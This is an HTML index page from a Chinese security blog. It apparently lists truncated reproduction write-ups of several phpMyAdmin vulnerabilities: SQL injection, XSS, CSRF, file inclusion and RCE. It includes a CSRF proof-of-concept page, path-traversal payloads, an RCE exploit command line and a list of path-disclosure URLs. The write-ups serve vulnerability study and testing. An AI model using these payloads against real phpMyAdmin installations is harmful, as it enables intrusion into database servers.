@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/50/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2020-5504%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.057Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-5504）Phpmyadmin-后台sql注入漏洞"><a href="#（CVE-2020-5504）Phpmyadmin-后台sql注入漏洞" class="headerlink" title="（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞"></a>（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在用户帐户页面中发现了一个SQL注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义SQL来代替其自己的用户名。攻击者必须具有有效的MySQL帐户才能访问服务器。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin &lt;= 5.00</p>
+<p>Phpmyadmin &lt;= 4.94</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>docker一把梭</p>
+<pre><code>docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2020-5504%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2020-5504%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quaw00eiy8v1cm961ccs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2019-18622）Phpmyadmin xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.054Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-18622）Phpmyadmin-xss"><a href="#（CVE-2019-18622）Phpmyadmin-xss" class="headerlink" title="（CVE-2019-18622）Phpmyadmin xss"></a>（CVE-2019-18622）Phpmyadmin xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>官方公布的是sql注入漏洞，但是实际是xss漏洞</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin &lt;=4.9.2，至少影响到4.7.7。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看官方修复的方式：</p>
+<p><img src="/resource/(CVE-2019-18622)Phpmyadminxss/media/rId25.png"></p>
+<p>如上图，先关注/js/designer/move.js文件，可以看到单纯的修改了取值方式，最终的值通过POST<br>方式提交到db_desingner.php文件，关键内容如下：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-18622%EF%BC%89Phpmyadmin%20xss/" data-id="cl5c2quav00ehy8v15vlq3c9h" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2019-12616）Phpmyadmin CSRF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-12616%EF%BC%89Phpmyadmin%20CSRF/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.051Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-12616）Phpmyadmin-CSRF"><a href="#（CVE-2019-12616）Phpmyadmin-CSRF" class="headerlink" title="（CVE-2019-12616）Phpmyadmin CSRF"></a>（CVE-2019-12616）Phpmyadmin CSRF</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>4.9.0之前在phpmyadmin中发现了一个问题。发现一个漏洞，允许攻击者对phpMyAdmin用户触发CSRF攻击。攻击者可以欺骗用户。</p>
+<pre><code>例如通过指向受害者的phpMyAdmin数据库的一个损坏的&lt;img&gt;标记，并且攻击者可以潜在地将有效负载（例如特定的插入或删除语句）传递给受害者。
+</code></pre>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin &lt;= 4.9.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET http://www.0-sec.org:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&amp;show_query=1&amp;db=phpmyadmin&amp;table=pma__bookmark HTTP/1.1
+
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci; pmaUser-1=%7B%22iv%22%3A%22M16ZzlA0rqF9BZ1jFsssjQ%3D%3D%22%2C%22mac%22%3A%22804941d12fceca0997e181cbcb8427d68c668240%22%2C%22payload%22%3A%22mD9juTxAYhC7lA7XPWHWOw%3D%3D%22%7D; phpMyAdmin=9bdd66557e399fc1447bf253bc2dc133
+Upgrade-Insecure-Requests: 1
+Host: localhost:9000
+</code></pre>
+<p>攻击者可以很容易地创建一个假超链接，其中包含希望代表用户执行的请求，这样就可能由于错误地使用http方法而导致csrf攻击</p>
+<pre><code>#POC
+&lt;!doctype html&gt;
+
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;title&gt;POC CVE-2019-12616&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;a href=&quot;http://www.0-sec.org:9000/tbl_sql.php?sql_query=INSERT+INTO+`pma__bookmark`+(`id`%2C+`dbase`%2C+`user`%2C+`label`%2C+`query`)+VALUES+(DAYOFWEEK(&#39;&#39;)%2C+&#39;&#39;%2C+&#39;&#39;%2C+&#39;&#39;%2C+&#39;&#39;)&amp;show_query=1&amp;db=phpmyadmin&amp;table=pma__bookmark&quot;&gt;View my Pictures!&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-12616%EF%BC%89Phpmyadmin%20CSRF/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2019-12616%EF%BC%89Phpmyadmin%20CSRF/" data-id="cl5c2quav00egy8v15tx8er97" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2018-19968）Phpmyadmin 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-19968%EF%BC%89Phpmyadmin%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.048Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-19968）Phpmyadmin-文件包含漏洞"><a href="#（CVE-2018-19968）Phpmyadmin-文件包含漏洞" class="headerlink" title="（CVE-2018-19968）Phpmyadmin 文件包含漏洞"></a>（CVE-2018-19968）Phpmyadmin 文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段<br>‘Filename’，正常情况下 phpMyAdmin<br>只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在<br>phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。</p>
+<p>通常情况下Transformation的规则存储在每个数据库的pma__column_info表中，而在phpMyAdmin<br>4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin 4.8.0~4.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>1、首先登陆进后台，这里默认是root, toor</p>
+<p><img src="/resource/(CVE-2018-19968)Phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>2、创建数据库，并将PHP代码写入SESSION文件中</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-19968%EF%BC%89Phpmyadmin%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-19968%EF%BC%89Phpmyadmin%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quat00eey8v1axwb051w" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-12613%EF%BC%89Phpmyadmin%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.045Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-12613）Phpmyadmin-远程文件包含漏洞"><a href="#（CVE-2018-12613）Phpmyadmin-远程文件包含漏洞" class="headerlink" title="（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞"></a>（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpMyAdmin 4.8.0和4.8.1受到影响。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先需要登录phpmyadmin</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre><code>http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../phpStudy/使用说明.txt
+</code></pre>
+<p><img src="/resource/(CVE-2018-12613)Phpmyadmin%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<h3 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-12613%EF%BC%89Phpmyadmin%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2018-12613%EF%BC%89Phpmyadmin%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quau00efy8v1e2ln6tu8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2016-5734%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.042Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-5734）Phpmyadmin-后台远程命令执行漏洞"><a href="#（CVE-2016-5734）Phpmyadmin-后台远程命令执行漏洞" class="headerlink" title="（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞"></a>（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>4.0.10.16之前4.0.x版本4.4.15.7之前4.4.x版本4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个功能需要登录，且能够写入数据。</p>
+<p>因为目标环境使用root，所以我们可以创建一个临时数据库和数据表，进行漏洞利用。这里，我们使用POC来复现漏洞。</p>
+<pre><code>./cve-2016-5734.py -c &#39;system(id);&#39; -u root -p root -d test http://www.0-sec.org:8080/
+</code></pre>
+<p><img src="/resource/(CVE-2016-5734)Phpmyadmin%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="VS4QW3R595\~78N763.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2016-5734%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2016-5734%EF%BC%89Phpmyadmin%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quas00edy8v1fb8deybs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2014%20-8959%EF%BC%89Phpmyadmin%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.040Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2014-8959）Phpmyadmin-本地文件包含漏洞"><a href="#（CVE-2014-8959）Phpmyadmin-本地文件包含漏洞" class="headerlink" title="（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞"></a>（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpMyAdmin 4 .0.1--4 .2.12PHP version &lt; 5.3.4</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=
+/../../../../phpinfo.txt%00    # 注意改下token值
+</code></pre>
+<p>在实际利用中可以利用写入文件到 /tmp 目录下结合此漏洞完成 RCE，php<br>版本可以通过 http header、</p>
+<p>导出表内容到文件的附加内容看到。</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2014%20-8959%EF%BC%89Phpmyadmin%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/%EF%BC%88CVE-2014%20-8959%EF%BC%89Phpmyadmin%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2quar00ecy8v158179yzl" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/Phpmyadmin 爆路径" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20%E7%88%86%E8%B7%AF%E5%BE%84/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.037Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>/phpmyadmin/libraries/lect_lang.lib.php
+/phpMyAdmin/index.php?lang[]=1
+/phpMyAdmin/phpinfo.php
+load_file()
+/phpmyadmin/themes/darkblue_orange/layout.inc.php
+/phpmyadmin/libraries/select_lang.lib.php
+/phpmyadmin/libraries/lect_lang.lib.php
+/phpmyadmin/libraries/mcrypt.lib.php
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20%E7%88%86%E8%B7%AF%E5%BE%84/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/Phpmyadmin%20%E7%88%86%E8%B7%AF%E5%BE%84/" data-id="cl5c2quar00eby8v1ctefh12v" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/Phpmyadmin _ 4.8.3 XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.034Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpmyadmin-lt-4-8-3-XSS"><a href="#Phpmyadmin-lt-4-8-3-XSS" class="headerlink" title="Phpmyadmin &lt; 4.8.3 XSS"></a>Phpmyadmin &lt; 4.8.3 XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>最近在审计phpmyadmin的时候发现了一个XSS漏洞，后来发现在版本大于4.8.3以后该漏洞被修复了。看了下之前公布的CVE，有个CVE和此漏洞很相似但没有漏洞细节，于是乎便有了这篇文章。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpmyadmin &lt; 4.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在审计phpmyadmin时，我比较关注$GLOBALS全局变量，该变量存储了本次请求的信息、phpmyadmin基本设置信息和phpmyadmin配置文件信息等。先看看/libraries/classes/Server/Privileges.php::3977的以下代码。</p>
+<pre><code>foreach ($row as $key =&gt; $value) &#123;
+    $GLOBALS[$key] = $value;
+&#125;
+</code></pre>
+<p>很明显，该处是$GLOBALS的赋值操作，而$row来自于对mysql.user表的查询结果，且$user_host_condition可控，/libraries/classes/Server/Privileges.php::3966行</p>
+<pre><code>public static function getDataForChangeOrCopyUser()
+    &#123;
+        $queries = null;
+        $password = null;
+
+        if (isset($_REQUEST[&#39;change_copy&#39;])) &#123;
+            $user_host_condition = &#39; WHERE `User` = &#39;
+                . &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_username&#39;]) . &quot;&#39;&quot;
+                . &#39; AND `Host` = &#39;
+                . &quot;&#39;&quot; . $GLOBALS[&#39;dbi&#39;]-&gt;escapeString($_REQUEST[&#39;old_hostname&#39;]) . &quot;&#39;;&quot;;
+            $row = $GLOBALS[&#39;dbi&#39;]-&gt;fetchSingleRow(
+                &#39;SELECT * FROM `mysql`.`user` &#39; . $user_host_condition
+            );
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpmyadmin/Phpmyadmin%20_%204.8.3%20XSS/" data-id="cl5c2quaq00eay8v16qdfckqr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Phpmyadmin/Phpmyadmin setup页面配置不当的利用姿势整合" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpmyadmin/Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.031Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpmyadmin-setup页面配置不当的利用姿势整合"><a href="#Phpmyadmin-setup页面配置不当的利用姿势整合" class="headerlink" title="Phpmyadmin setup页面配置不当的利用姿势整合"></a>Phpmyadmin setup页面配置不当的利用姿势整合</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpMyAdmin<br>4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)<img src="/resource/Phpmyadminsetup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/media/rId24.png" alt="1.png">我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行</p>
